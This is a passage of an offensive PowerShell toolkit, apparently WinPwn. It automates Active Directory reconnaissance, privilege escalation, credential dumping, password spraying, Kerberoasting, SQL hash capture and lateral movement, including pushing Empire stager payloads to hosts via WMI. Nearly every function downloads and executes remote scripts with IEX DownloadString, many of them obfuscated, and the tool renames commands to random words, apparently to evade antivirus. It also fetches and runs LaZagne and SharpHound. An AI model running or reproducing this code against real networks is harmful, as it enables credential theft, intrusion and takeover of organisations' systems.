            Write-Host -ForegroundColor Yellow 'Creating Domain User-List:'
            Get-DomainUserList -Domain $domain_Name.Name -RemoveDisabled -RemovePotentialLockouts | Out-File -Encoding ascii "$currentPath\DomainRecon\userlist.txt"
            
            Write-Host -ForegroundColor Yellow 'Searching for Exploitable Systems:'
            inset >> "$currentPath\DomainRecon\ExploitableSystems.txt"

            ## TODO Invoke-WebRequest -Uri 'https://github.com/NetSPI/goddi/releases/download/v1.1/goddi-windows-amd64.exe' -Outfile $currentPath\Recon.exe
            ## TODO https://github.com/canix1/ADACLScanner 

            #Powerview
            Write-Host -ForegroundColor Yellow 'All those PowerView Network Skripts for later Lookup getting executed and saved:'
            skulked >> "$currentPath\DomainRecon\NetDomain.txt"
            televisions >> "$currentPath\DomainRecon\NetForest.txt"
            misdirects >> "$currentPath\DomainRecon\NetForestDomain.txt"      
            odometer >> "$currentPath\DomainRecon\NetDomainController.txt"  
            Houyhnhnm >> "$currentPath\DomainRecon\NetUser.txt"    
            Randal >> "$currentPath\DomainRecon\NetSystems.txt"
	        Get-Printer >> "$currentPath\DomainRecon\localPrinter.txt"
            damsels >> "$currentPath\DomainRecon\NetOU.txt"    
            xylophone >> "$currentPath\DomainRecon\NetSite.txt"  
            ignominies >> "$currentPath\DomainRecon\NetSubnet.txt"
            reapportioned >> "$currentPath\DomainRecon\NetGroup.txt" 
            confessedly >> "$currentPath\DomainRecon\NetGroupMember.txt"   
            aqueduct >> "$currentPath\DomainRecon\NetFileServer.txt" 
            marinated >> "$currentPath\DomainRecon\DFSshare.txt" 
            liberation >> "$currentPath\DomainRecon\NetShare.txt" 
            cherubs >> "$currentPath\DomainRecon\NetLoggedon"
            Trojans >> "$currentPath\DomainRecon\Domaintrusts.txt"
            sequined >> "$currentPath\DomainRecon\ForestTrust.txt"
            ringer >> "$currentPath\DomainRecon\ForeignUser.txt"
            condor >> "$currentPath\DomainRecon\ForeignGroup.txt"
            IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/viewdevobfs.ps1')
            breviaries -Printers >> "$currentPath\DomainRecon\DomainPrinters.txt" 	        
	    IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/SPN-Scan.ps1')
	    Discover-PSInterestingServices >> "$currentPath\DomainRecon\SPNScan_InterestingServices.txt"
	    
            #Search for AD-Passwords in description fields
            Write-Host -ForegroundColor Yellow 'Searching for passwords in active directory description fields..'
            
            [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
            
            Invoke-Webrequest -Uri 'https://github.com/SecureThisShit/Creds/raw/master/Microsoft.ActiveDirectory.Management.dll' -Outfile "$currentPath\Microsoft.ActiveDirectory.Management.dll"
            Import-Module .\Microsoft.ActiveDirectory.Management.dll
	        iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/adpass.ps1')
            thyme >> "$currentPath\DomainRecon\Passwords_in_description.txt"

            Write-Host -ForegroundColor Yellow 'Searching for Users without password Change for a long time'
	        $Date = (Get-Date).AddYears(-1).ToFileTime()
            prostituted -LDAPFilter "(pwdlastset<=$Date)" -Properties samaccountname,pwdlastset >> "$currentPath\DomainRecon\Users_Nochangedpassword.txt"
	        
	        prostituted -LDAPFilter "(!userAccountControl:1.2.840.113556.1.4.803:=2)" -Properties distinguishedname >> "$currentPath\DomainRecon\Enabled_Users.txt"
            prostituted -UACFilter NOT_ACCOUNTDISABLE -Properties distinguishedname >> "$currentPath\DomainRecon\Enabled_Users.txt"
	        
            Write-Host -ForegroundColor Yellow 'Searching for Unconstrained delegation Systems and Users'
	        $Computers = breviaries -Unconstrained >> "$currentPath\DomainRecon\Unconstrained_Systems.txt"
            $Users = prostituted -AllowDelegation -AdminCount >> "$currentPath\DomainRecon\AllowDelegationUsers.txt"
	        
            Write-Host -ForegroundColor Yellow 'Identify kerberos and password policy..'
	        $DomainPolicy = forsakes -Policy Domain
            $DomainPolicy.KerberosPolicy >> "$currentPath\DomainRecon\Kerberospolicy.txt"
            $DomainPolicy.SystemAccess >> "$currentPath\DomainRecon\Passwordpolicy.txt"
	        
            Write-Host -ForegroundColor Yellow 'Searching for Systems we have RDP access to..'
	        rewires -LocalGroup RDP -Identity   >> "$currentPath\DomainRecon\RDPAccess_Systems.txt" 
	        
	        $session = Read-Host -Prompt 'Do you want to search for potential sensitive domain share files - can take a while? (yes/no)'
            if ($session -eq "yes" -or $session -eq "y" -or $session -eq "Yes" -or $session -eq "Y")
            {
	        	mangers >> "$currentPath\DomainRecon\InterestingDomainshares.txt"
	        }
            
            $aclight = Read-Host -Prompt 'Starting ACLAnalysis for Shadow Admin detection? (yes/no)'
            if ($aclight -eq "yes" -or $aclight -eq "y" -or $aclight -eq "Yes" -or $aclight -eq "Y")
            {
	    	    Write-Host -ForegroundColor Yellow 'Starting ACLAnalysis for Shadow Admin detection:'
                invoke-expression 'cmd /c start powershell -Command {$Wcl = new-object System.Net.WebClient;$Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;IEX(New-Object Net.WebClient).DownloadString(''https://raw.githubusercontent.com/SecureThisShit/ACLight/master/ACLight2/ACLight2.ps1'');Start-ACLsAnalysis;Write-Host -ForegroundColor Yellow ''Moving Files:'';mv C:\Results\ .\DomainRecon\;}'

	        }
            
	    
            $powersql = Read-Host -Prompt 'Start PowerUpSQL Checks? (yes/no)'
            if ($powersql -eq "yes" -or $powersql -eq "y" -or $powersql -eq "Yes" -or $powersql -eq "Y")
            {
	    	    powerSQL    
	        }

            $spoolscan = Read-Host -Prompt 'Start MS-RPRN RPC Service Scan? (yes/no)'
            if ($spoolscan -eq "yes" -or $spoolscan -eq "y" -or $spoolscan -eq "Yes" -or $spoolscan -eq "Y")
            {
	    	        Write-Host -ForegroundColor Yellow 'Checking Domain Controllers for MS-RPRN RPC-Service! If its available, you can nearly do DCSync.' #https://www.slideshare.net/harmj0y/derbycon-the-unintended-risks-of-trusting-active-directory
                    iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/SpoolerScanner/master/SpoolerScan.ps1')
                    $domcontrols = terracing
                    foreach ($domc in $domcontrols.IPAddress)
                    {
                        if (spoolscan -target $domc)
                        {
                            Write-Host -ForegroundColor Yellow 'Found vulnerable DC. You can take the DC-Hash for SMB-Relay attacks now'
                            echo "$domc" >> "$currentPath\DomainRecon\MS-RPNVulnerableDC_$domc.txt"
                        }
                    }
		    $othersystems = Read-Host -Prompt 'Start MS-RPRN RPC Service Scan for other active Windows Servers in the domain? (yes/no)'
            	    if ($othersystems -eq "yes" -or $othersystems -eq "y" -or $othersystems -eq "Yes" -or $othersystems -eq "Y")
                    {
		    	Write-Host -ForegroundColor Yellow 'Searching for active Servers in the domain, this can take a while depending on the domain size'
		    	$ActiveServers = breviaries -Ping -OperatingSystem "Windows Server*"
			foreach ($acserver in $ActiveServers.dnshostname)
                    	{
                        	if (spoolscan -target $acserver)
                        	{
                            		Write-Host -ForegroundColor Yellow 'Found vulnerable Server - $acserver. You can take the DC-Hash for SMB-Relay attacks now'
                            		echo "$acserver" >> "$currentPath\DomainRecon\MS-RPNVulnerableServers.txt"
                        	}
                    	}
		    }
                    
	        }
	    $ms1710 = Read-Host -Prompt 'Search for MS17-10 vulnerable Windows Servers in the domain? (yes/no)'
            if ($ms1710 -eq "yes" -or $ms1710 -eq "y" -or $ms1710 -eq "Yes" -or $ms1710 -eq "Y")
            {
	    	MS17-10	    	
	    }
	    
	    $domainsharepass = Read-Host -Prompt 'Check Domain Network-Shares for cleartext passwords using passhunt.exe? (yes/no)'
            if ($domainsharepass -eq "yes" -or $domainsharepass -eq "y" -or $domainsharepass -eq "Yes" -or $domainsharepass -eq "Y")
            {
                passhunt -domain $true
            }
	    
            Write-Host -ForegroundColor Yellow 'Downloading ADRecon Script:'
            Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/SecureThisShit/Creds/master/ADRecon.ps1' -Outfile "$currentPath\DomainRecon\ADrecon\recon.ps1"
            Write-Host -ForegroundColor Yellow 'Executing ADRecon Script:'
            cmd /c start powershell -Command {"$currentPath\DomainRecon\ADrecon\recon.ps1"}
}

function MS17-10
{
<#
        .DESCRIPTION
        Search in AD for pingable Windows servers and Check if they are vulnerable to MS17-10.
        Author: @securethisshit
        License: BSD 3-Clause
    #>
    #Domain Recon / Lateral Movement / Exploitation Phase
    IEX (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Creds/master/ms17-10.ps1')
    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/viewdevobfs.ps1')
    $serversystems = Read-Host -Prompt 'Start MS17-10 Scan for Windows Servers only (alternatively we can scan all Servers + Clients but this can take a while)? (yes/no)'
    if ($serversystems -eq "yes" -or $serversystems -eq "y" -or $serversystems -eq "Yes" -or $serversystems -eq "Y")
    {
	Write-Host -ForegroundColor Yellow 'Searching for active Servers in the domain, this can take a while depending on the domain size'
	$ActiveServers = breviaries -Ping -OperatingSystem "Windows Server*"
	foreach ($acserver in $ActiveServers.dnshostname)
        {
         	if (Scan-MS17-10 -target $acserver)
                {
                	Write-Host -ForegroundColor Yellow 'Found vulnerable Server - $acserver. Just Pwn this system!'
                        echo "$acserver" >> "$currentPath\Exploitation\MS17-10_VulnerableServers.txt"
                }
        }
    }
    else
    {
    	Write-Host -ForegroundColor Yellow 'Searching every windows system in the domain, this can take a while depending on the domain size'
	$ActiveServers = breviaries -Ping -OperatingSystem "Windows*"
	foreach ($acserver in $ActiveServers.dnshostname)
        {
         	if (Scan-MS17-10 -target $acserver)
                {
                	Write-Host -ForegroundColor Yellow 'Found vulnerable System - $acserver. Just Pwn it!'
                        echo "$acserver" >> "$currentPath\Exploitation\MS17-10_VulnerableSystems.txt"
                }
        }
    }

}

function powerSQL
{
<#
        .DESCRIPTION
        AD-Search for SQL-Servers. Login for current user tests. Default Credential Testing, UNC-PATH Injection SMB Hash extraction.
        Author: @securethisshit
        License: BSD 3-Clause
    #>
    #Domain Recon / Lateral Movement Phase
   
    Write-Host -ForegroundColor Yellow 'Searching for SQL Server instances in the domain:'
    iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Creds/master/PowerUpSQL.ps1')
    Get-SQLInstanceDomain -Verbose >> "$currentPath\DomainRecon\SQLServers.txt"
    
    Write-Host -ForegroundColor Yellow 'Checking login with the current user Account:'
    $Targets = Get-SQLInstanceDomain -Verbose | Get-SQLConnectionTestThreaded -Verbose -Threads 10 | Where-Object {$_.Status -like "Accessible"} 
    $Targets >> "$currentPath\DomainRecon\SQLServer_Accessible.txt"
    $Targets.Instance >> "$currentPath\DomainRecon\SQLServer_AccessibleInstances.txt"
    
    Write-Host -ForegroundColor Yellow 'Checking Default Credentials for all Instances:'
    Get-SQLInstanceDomain | Get-SQLServerLoginDefaultPw -Verbose >> "$currentPath\DomainRecon\SQLServer_DefaultLogin.txt"
    
    Write-Host -ForegroundColor Yellow 'Dumping Information and Auditing all accesible Databases:'
    foreach ($line in $Targets.Instance)
    {
        Get-SQLServerInfo -Verbose -Instance $line >> "$currentPath\DomainRecon\SQLServer_Accessible_GeneralInformation.txt"
        Invoke-SQLDumpInfo -Verbose -Instance $line $line >> "$currentPath\DomainRecon\SQLServer_Accessible_DumpInformation.txt"
        Invoke-SQLAudit -Verbose -Instance $line >> "$currentPath\DomainRecon\SQLServer_Accessible_Audit_$Targets.Computername.txt"
        mkdir "$currentPath\DomainRecon\SQLInfoDumps"
        $Targets | Get-SQLColumnSampleDataThreaded -Verbose -Threads 10 -Keyword "password,pass,credit,ssn,pwd" -SampleSize 2 -ValidateCC -NoDefaults >> "$currentPath\DomainRecon\SQLServer_Accessible_PotentialSensitiveData.txt" 
    }
    Write-Host -ForegroundColor Yellow 'Moving CSV-Files to SQLInfoDumps folder:'
    move *.csv "$currentPath\DomainRecon\SQLInfoDumps\"
    $uncpath = Read-Host -Prompt 'Execute UNC-Path Injection tests for accesible SQL Servers to gather some Netntlmv2 Hashes? (yes/no)'
    if ($uncpath -eq "yes" -or $uncpath -eq "y" -or $uncpath -eq "Yes" -or $uncpath -eq "Y")
    {
        $responder = Read-Host -Prompt 'Do you have Responder.py running on another machine in this network? (If not we can start inveigh) - (yes/no)'
        if ($responder -eq "yes" -or $responder -eq "y" -or $responder -eq "Yes" -or $responder -eq "Y")
        {
            $smbip = Read-Host -Prompt 'Please enter the IP-Address of the hash capturing Network Interface:'
        }
        else
        {
            $smbip = Get-currentIP
            Inveigh
        }
	    Invoke-SQLUncPathInjection -Verbose -CaptureIp $smbip.IPv4Address.IPAddress    
	}
    # XP_Cmdshell functions follow - maybe.
	      
}

function Get-currentIP
{
<#
        .DESCRIPTION
        Gets the current active IP-Address configuration.
        Author: @securethisshit
        License: BSD 3-Clause
    #>
    #Domain Recon / Lateral Movement Phase
    $IPaddress = Get-NetIPConfiguration | Where-Object {$_.IPv4DefaultGateway -ne $null -and $_.NetAdapter.Status -ne "Disconnected"}
    return $IPaddress
}

function sharphound
{
<#
        .DESCRIPTION
        Downloads Sharphound.exe and collects All AD-Information for Bloodhound.
        Author: @securethisshit
        License: BSD 3-Clause
    #>
    #Domain Recon / Lateral Movement Phase
    $Wcl = new-object System.Net.WebClient
    $Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
    pathcheck
    Invoke-WebRequest -Uri 'https://github.com/BloodHoundAD/BloodHound/raw/master/Ingestors/SharpHound.exe' -Outfile "$currentPath\Domainrecon\Sharphound.exe"
    
    Write-Host -ForegroundColor Yellow 'Running Sharphound Collector: '
    .\DomainRecon\Sharphound.exe -c All

}

function privescmodules
{
<#
        .DESCRIPTION
        All privesc scripts are executed here.
        Author: @securethisshit
        License: BSD 3-Clause
    #>
    #Privilege Escalation Phase
    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
    pathcheck
    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/locksher.ps1')
    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/UpPower.ps1')
    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/GPpass.ps1')
    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/AutoGP.ps1')
    iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/DumpWCM.ps1')

    Write-Host -ForegroundColor Yellow 'Dumping Windows Credential Manager:'
    Invoke-WCMDump >> $currentPath\LocalPrivesc\WCMCredentials.txt

    Write-Host -ForegroundColor Yellow 'Getting Local Privilege Escalation possibilities:'

    Write-Host -ForegroundColor Yellow 'Getting GPPPasswords:'
    amazon >> $currentPath\LocalPrivesc\GPP_Auto.txt
    Shockley >> $currentPath\LocalPrivesc\GPP_Passwords.txt

    Write-Host -ForegroundColor Yellow 'Looking for Local Privilege Escalation possibilities:'
    families >> $currentPath\LocalPrivesc\All_Localchecks.txt

    Write-Host -ForegroundColor Yellow 'Looking for MS-Exploits on this local system for Privesc:'
    proportioned >> $currentPath\LocalPrivesc\Sherlock_Vulns.txt
    
    iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Creds/master/IkeextCheck.ps1')
    Invoke-IkeextCheck >> "$currentPath\LocalPrivesc\IkeExtVulnerable.txt"
    
    $search = Read-Host -Prompt 'Start Just Another Windows (Enum) Script? (yes/no)'
    if ($search -eq "yes" -or $search -eq "y" -or $search -eq "Yes" -or $search -eq "Y")
    {
        jaws
    }
}

function lazagnemodule
{
    <#
        .DESCRIPTION
        Downloads and executes Lazagne from AlessandroZ for Credential gathering / privilege escalation.
        Author: @securethisshit
        License: BSD 3-Clause
    #>
    #Privilege Escalation Phase
    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
    pathcheck
    Invoke-WebRequest -Uri 'https://github.com/AlessandroZ/LaZagne/releases/download/2.3.1/Windows.zip' -Outfile $currentPath\Lazagne.zip
    Unzip "$currentPath\Lazagne.zip" "$currentPath\Lazagne"
    Write-Host -ForegroundColor Yellow 'Checking, if the file was killed by antivirus:'
    if (Test-Path $currentPath\Lazagne\Windows\laZagne.exe)
    {
        Write-Host -ForegroundColor Yellow 'Not killed, Executing:'
        "$currentPath\Lazagne\Windows\laZagne.exe all" >> $currentPath\Lazagne\Passwords.txt
        Write-Host -ForegroundColor Yellow 'Results saved to $currentPath\Lazagne\Passwords.txt!'
    }
    else {Write-Host -ForegroundColor Red 'Antivirus got it, try an obfuscated version or RAM-Execution with Pupy:'}
}

function latmov
{
    <#
        .DESCRIPTION
        Looks for administrative Access on any system in the current network/domain. If Admin Access is available somewhere, Credentials can be dumped remotely / alternatively Powershell_Empire Stager can be executed.
        Brute Force for all Domain Users with specific Passwords (for example Summer2018) can be done here.
        Author: @securethisshit
        License: BSD 3-Clause
    #>
    #Lateral Movement Phase
    pathcheck
    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/masskittie.ps1')
    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/DomainPasswordSpray.ps1')
    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/view.ps1')
    $domain_Name = Get-NetDomain
    $Domain = $domain_Name.Name
    
    Write-Host -ForegroundColor Yellow 'Starting Lateral Movement Phase:'

    Write-Host -ForegroundColor Yellow 'Searching for Domain Systems we can pwn with admin rights, this can take a while depending on the size of your domain:'

    fuller >> $currentPath\Exploitation\LocalAdminAccess.txt

    $exploitdecision = Read-Host -Prompt 'Do you want to Dump Credentials on all found Systems or Execute Empire Stager? (dump/empire)'
    if ($exploitdecision -eq "dump" -or $exploitdecision -eq "kittie" -or $exploitdecision -eq "Credentials")
    {
        #Masskittie
        $masskittie = Read-Host -Prompt 'Do you want to use Masskittie for all found Systems? (yes/no)'
        if ($masskittie -eq "yes" -or $masskittie -eq "y" -or $masskittie -eq "Yes" -or $masskittie -eq "Y")
        {
           if (Test-Path $currentPath\Exploitation\LocalAdminAccess.txt)
           {
               bookmobile -sILeZZaOSNUwrt9 $currentPath\Exploitation\LocalAdminAccess.txt >> $currentPath\Exploitation\PwnedSystems_Credentials.txt
           }
           else { Write-Host -ForegroundColor Red 'No Systems with admin-Privileges found in this domain' }
        }
    }
    elseif ($exploitdecision -eq "empire" -or $exploitdecision -eq "RAT")
    {
        empirelauncher
    }
    #Domainspray
    $domainspray = Read-Host -Prompt 'Do you want to Spray the Network with prepared Credentials? (yes/no)'
    if ($domainspray -eq "yes" -or $domainspray -eq "y" -or $domainspray -eq "Yes" -or $domainspray -eq "Y")
    {

       if (Test-Path $currentPath\passlist.txt) 
        {
            Invoke-DomainPasswordSpray -UserList $currentPath\DomainRecon\userlist.txt -Domain $domain_Name.Name -PasswordList $currentPath\passlist.txt -OutFile $currentPath\Exploitation\Pwned-creds_Domainpasswordspray.txt
        }
        else 
        { 
           Write-Host -ForegroundColor Red 'There is no passlist.txt File in the current folder'
           $passlist = Read-Host -Prompt 'Please enter one Password for DomainSpray manually:'
           $passlist >> $currentPath\passlist.txt
           Invoke-DomainPasswordSpray -UserList $currentPath\DomainRecon\userlist.txt -Domain $domain.Name -PasswordList $currentPath\passlist.txt -OutFile $currentPath\Exploitation\Pwned-creds_Domainpasswordspray.txt  
        }
    }
}

function empirelauncher
{
    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
    pathcheck
    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/wmicmd.ps1')
    if (Test-Path $currentPath\Exploitation\LocalAdminAccess.txt)
    {
        $exploitHosts = Get-Content "$currentPath\Exploitation\LocalAdminAccess.txt"
    }
    else
    {
        $file = "$currentPath\Exploitation\Exploited_Empire.txt"
        While($i -ne "quit") 
        {
	        If ($i -ne $NULL) 
            {
		        $i.Trim() | Out-File $file -append
	        }
	        $i = Read-Host -Prompt 'Please provide one or more IP-Adress as target:'    
        }

    }

    $stagerfile = "$currentPath\Exploitation\Empire_Stager.txt"
    While($Payload -ne "quit") 
    {
	    If ($Payload -ne $NULL) 
        {
	        $Payload.Trim() | Out-File $stagerfile -append
	    }
        $Payload = Read-Host -Prompt 'Please provide the powershell Empire Stager payload (beginning with "powershell -noP -sta -w 1 -enc  BASE64Code") :'
    }
    
    $executionwith = Read-Host -Prompt 'Use the current User for Payload Execution? (yes/no):'

    if (Test-Path $currentPath\Exploitation\Exploited_Empire.txt)
    {
        $Hosts = Get-Content "$currentPath\Exploitation\Exploited_Empire.txt"
    }
    else {$Hosts = Get-Content "$currentPath\Exploitation\LocalAdminAccess.txt"}

    if ($executionwith -eq "yes" -or $executionwith -eq "y" -or $executionwith -eq "Yes" -or $executionwith -eq "Y")
    {
        $Hosts | bootblacks -OnVxcvnOYdGIHyL $Payload
    }
    else 
    {
        $Credential = Get-Credential
        $Hosts | bootblacks -OnVxcvnOYdGIHyL $Payload -bOo9UijDlqABKpS $Credential
    }
}

function shareenumeration
{
    <#
        .DESCRIPTION
        Enumerates Shares in the current network, also searches for sensitive Files on the local System + Network.
        Author: @securethisshit
        License: BSD 3-Clause
    #>
    #Enumeration Phase
    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
    pathcheck
    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/view.ps1')
    Write-Host -ForegroundColor Yellow 'Searching for sensitive Files on the Domain-Network, this can take a while:'
    Claire >> $currentPath\SensitiveFiles.txt
    shift -qgsNZggitoinaTA >> $currentPath\Networkshares.txt
}

function groupsearch
{
    <#
        .DESCRIPTION
        AD can be searched for specific User/Group Relations over Group Policies.
        Author: @securethisshit
        License: BSD 3-Clause
    #>
    #Enumeration Phase
    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
    pathcheck
    iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/viewdevobfs.ps1')
    $user = Read-Host -Prompt 'Do you want to search for other users than the session-user? (yes/no)'
            if ($user -eq "yes" -or $user -eq "y" -or $user -eq "Yes" -or $user -eq "Y")
            {
                Write-Host -ForegroundColor Yellow 'Please enter a username to search for:'
                $username = Get-Credential
                $group = Read-Host -Prompt 'Please enter a Group-Name to search for: (Administrators,RDP)'
                Write-Host -ForegroundColor Yellow 'Searching...:'
                rewires -LocalGroup $group -Credential $username >> $currentPath\Groupsearches.txt
            }
            else
            {
                $group = Read-Host -Prompt 'Please enter a Group-Name to search for: (Administrators,RDP)'
                Write-Host -ForegroundColor Yellow 'Searching...:'
                rewires -LocalGroup $group -Identity $env:UserName >> $currentPath\Groupsearches.txt
                Write-Host -ForegroundColor Yellow 'Systems saved to >> $currentPath\Groupsearches.txt:'
            }
}

function proxydetect
{
    <#
        .DESCRIPTION
        Checks, if a proxy is active. Uses current users credentials for Proxy Access / other user input is possible as well.
        Author: @securethisshit
        License: BSD 3-Clause
    #>    
    #Proxy Detect #1
    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
    pathcheck
    Write-Host -ForegroundColor Yellow 'Searching for network proxy...'

    $reg2 = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey('CurrentUser', $env:COMPUTERNAME)
    $regkey2 = $reg2.OpenSubkey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings")

    if ($regkey2.GetValue('ProxyServer') -and $regkey2.GetValue('ProxyEnable'))
    {
        $proxy = Read-Host -Prompt 'Proxy detected! Proxy is: '$regkey2.GetValue('ProxyServer')'! Does the Powershell-User have proxy rights? (yes/no)'
        if ($proxy -eq "yes" -or $proxy -eq "y" -or $proxy -eq "Yes" -or $proxy -eq "Y")
        {
             #Proxy
            Write-Host -ForegroundColor Yellow 'Setting up Powershell-Session Proxy Credentials...'
            $Wcl = new-object System.Net.WebClient
            $Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
        }
        else
        {
            Write-Host -ForegroundColor Yellow 'Please enter valid credentials, or the script will fail!'
            #Proxy Integration manual user
            $webclient=New-Object System.Net.WebClient
            $creds=Get-Credential
            $webclient.Proxy.Credentials=$creds
        }
   }
    else {Write-Host -ForegroundColor Yellow 'No proxy detected, continuing... '}
}

function kerberoasting
{
    #Exploitation Phase
    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
    pathcheck
    Write-Host -ForegroundColor Yellow 'Starting Exploitation Phase:'
    Write-Host -ForegroundColor Red 'Kerberoasting active:'
    invoke-expression 'cmd /c start powershell -Command {$Wcl = new-object System.Net.WebClient;$Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;IEX(New-Object Net.WebClient).DownloadString(''https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1'');Invoke-Kerberoast -OutputFormat Hashcat | fl >> .\Exploitation\Kerberoasting.txt;Write-Host -ForegroundColor Yellow ''Module finished, Hashes saved to .\Exploitation\Kerberoasting.txt:'' ;pause}'
}

Function Get-Installedsoftware {
    [CmdletBinding(SupportsShouldProcess=$true)]
    param(
        [Parameter(ValueFromPipeline              =$true,
                   ValueFromPipelineByPropertyName=$true,
                   Position=0
        )]
        [string[]]
            $ComputerName = $env:COMPUTERNAME,
        [Parameter(Position=0)]
        [string[]]
            $Property,
        [string[]]
            $IncludeProgram,
        [string[]]
            $ExcludeProgram,
        [switch]
            $ProgramRegExMatch,
        [switch]
            $LastAccessTime,
        [switch]
            $ExcludeSimilar,
        [int]
            $SimilarWord
    )

    begin {
        $RegistryLocation = 'SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\',
                            'SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\'

        if ($psversiontable.psversion.major -gt 2) {
            $HashProperty = [ordered]@{}    
        } else {
            $HashProperty = @{}
            $SelectProperty = @('ComputerName','ProgramName')
            if ($Property) {
                $SelectProperty += $Property
            }
            if ($LastAccessTime) {
                $SelectProperty += 'LastAccessTime'
            }
        }
    }

    process {
        foreach ($Computer in $ComputerName) {
            try {
                $socket = New-Object Net.Sockets.TcpClient($Computer, 445)
                if ($socket.Connected) {
                    $RegBase = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey([Microsoft.Win32.RegistryHive]::LocalMachine,$Computer)
                    $RegistryLocation | ForEach-Object {
                        $CurrentReg = $_
                        if ($RegBase) {
                            $CurrentRegKey = $RegBase.OpenSubKey($CurrentReg)
                            if ($CurrentRegKey) {
                                $CurrentRegKey.GetSubKeyNames() | ForEach-Object {
                                    $HashProperty.ComputerName = $Computer
                                    $HashProperty.ProgramName = ($DisplayName = ($RegBase.OpenSubKey("$CurrentReg$_")).GetValue('DisplayName'))
                                    
                                    if ($IncludeProgram) {
                                        if ($ProgramRegExMatch) {
                                            $IncludeProgram | ForEach-Object {
                                                if ($DisplayName -notmatch $_) {
                                                    $DisplayName = $null
                                                }
                                            }
                                        } else {
                                            $IncludeProgram | ForEach-Object {
                                                if ($DisplayName -notlike $_) {
                                                    $DisplayName = $null
                                                }
                                            }
                                        }
                                    }

                                    if ($ExcludeProgram) {
                                        if ($ProgramRegExMatch) {
                                            $ExcludeProgram | ForEach-Object {
                                                if ($DisplayName -match $_) {
                                                    $DisplayName = $null
                                                }
                                            }
                                        } else {
                                            $ExcludeProgram | ForEach-Object {
                                                if ($DisplayName -like $_) {
                                                    $DisplayName = $null
                                                }
                                            }
                                        }
                                    }

                                    if ($DisplayName) {
                                        if ($Property) {
                                            foreach ($CurrentProperty in $Property) {
                                                $HashProperty.$CurrentProperty = ($RegBase.OpenSubKey("$CurrentReg$_")).GetValue($CurrentProperty)
                                            }
                                        }
                                        if ($LastAccessTime) {
                                            $InstallPath = ($RegBase.OpenSubKey("$CurrentReg$_")).GetValue('InstallLocation') -replace '\\$',''
                                            if ($InstallPath) {
                                                $WmiSplat = @{
                                                    ComputerName = $Computer
                                                    Query        = $("ASSOCIATORS OF {Win32_Directory.Name='$InstallPath'} Where ResultClass = CIM_DataFile")
                                                    ErrorAction  = 'SilentlyContinue'
                                                }
                                                $HashProperty.LastAccessTime = Get-WmiObject @WmiSplat |
                                                    Where-Object {$_.Extension -eq 'exe' -and $_.LastAccessed} |
                                                    Sort-Object -Property LastAccessed |
                                                    Select-Object -Last 1 | ForEach-Object {
                                                        $_.ConvertToDateTime($_.LastAccessed)
                                                    }
                                            } else {
                                                $HashProperty.LastAccessTime = $null
                                            }
                                        }
                                        
                                        if ($psversiontable.psversion.major -gt 2) {
                                            [pscustomobject]$HashProperty
                                        } else {
                                            New-Object -TypeName PSCustomObject -Property $HashProperty |
                                            Select-Object -Property $SelectProperty
                                        }
                                    }
                                    $socket.Close()
                                }

                            }

                        }

                    }
                }
            } catch {
                Write-Error $_
            }
        }
    }
}

function WinPwn
{
    <#
        .DESCRIPTION
        Main Function. Executes the other functions according to the users input.
        Author: @securethisshit
        License: BSD 3-Clause
    #>
$intro = @'

             
__        ___       ____                 
\ \      / (_)_ __ |  _ \__      ___ __  
 \ \ /\ / /| | '_ \| |_) \ \ /\ / | '_ \ 
  \ V  V / | | | | |  __/ \ V  V /| | | |
   \_/\_/  |_|_| |_|_|     \_/\_/ |_| |_|

